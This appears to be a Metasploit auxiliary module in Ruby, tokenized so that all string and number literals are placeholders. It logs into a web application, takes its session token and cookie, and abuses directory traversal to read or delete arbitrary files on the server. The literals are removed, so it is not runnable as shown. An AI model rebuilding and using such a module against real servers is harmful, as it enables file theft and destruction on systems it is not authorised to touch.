require <str> class Metasploit3 < Msf :: Auxiliary include Msf :: Exploit :: Remote :: HttpClient def initialize ( info = { } ) super ( update_info ( info , <str> = > <str> , <str> = > <str> , <str> = > [ <str> , <str> ] , <str> = > MSF_LICENSE , <str> = > [ [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] ] , <str> = > [ [ <str> , { <str> = > <str> } ] , [ <str> , { <str> = > <str> } ] ] , <str> = > <str> , <str> = > <str> ) ) register_options ( [ Opt :: RPORT ( <int> ) , OptInt . new ( <str> , [ true , <str> , <int> ] ) , OptString . new ( <str> , [ true , <str> , <str> ] ) , OptString . new ( <str> , [ true , <str> , <str> ] ) , OptString . new ( <str> , [ true , <str> ] ) , OptString . new ( <str> , [ true , <str> , <str> ] ) ] , self . class ) end def run print_status ( <str> ) if login print_good ( <str> ) else print_error ( <str> ) return end @traversal = <str> * <int> file = datastore [ <str> ] @platform = get_platform if @platform == <str> @traversal . gsub! ( <str> , <str> ) file . gsub! ( <str> , <str> ) else print_error ( <str> ) return end case action . name when <str> read_file ( datastore [ <str> ] ) when <str> delete_file ( datastore [ <str> ] ) end end def read_file ( file ) print_status ( <str> ) res = send_request_cgi ( { <str> = > normalize_uri ( target_uri . path , <str> , <str> , <str> ) , <str> = > <str> , <str> = > <str> @session <str> , <str> = > { <str> = > @token , <str> = > <str> @traversal <str> file <str> } } ) if res and res . code == <int> and res . headers [ <str> ] and res . body . length > <int> store_path = store_loot ( <str> , <str> , rhost , res . body , file ) print_good ( <str> store_path <str> ) else print_error ( <str> ) end end def delete_file ( file ) print_status ( <str> file <str> ) res = send_request_cgi ( { <str> = > normalize_uri ( target_uri . path ) , <str> = > <str> , <str> = > <str> @session <str> , <str> = > { <str> = > @token , <str> = > <str> , <str> = > <str> , <str> = > <str> @traversal <str> file <str> } } ) if res and res . code == <int> and res . body =~ <str> print_good ( <str> file <str> ) else print_error ( <str> file <str> ) end end def get_platform print_status ( <str> ) res = send_request_cgi ( { <str> = > normalize_uri ( target_uri . path ) , <str> = > <str> , <str> = > <str> @session <str> , <str> = > { <str> = > @token } } ) if res and res . code == <int> if res . body =~ <str> print_good ( <str> ) return <str> elsif res . body =~ <str> print_good ( <str> ) return <str> end end print_warning ( <str> ) return <str> end def login res = send_request_cgi ( { <str> = > normalize_uri ( target_uri . path ) , <str> = > <str> , <str> = > { <str> = > datastore [ <str> ] , <str> = > datastore [ <str> ] , <str> = > <str> , <str> = > <str> } } ) if res and res . code == <int> and res . headers [ <str> ] =~ <str> @token = $1 if res . get_cookies =~ <str> @session = $1 return true end end return false end end 
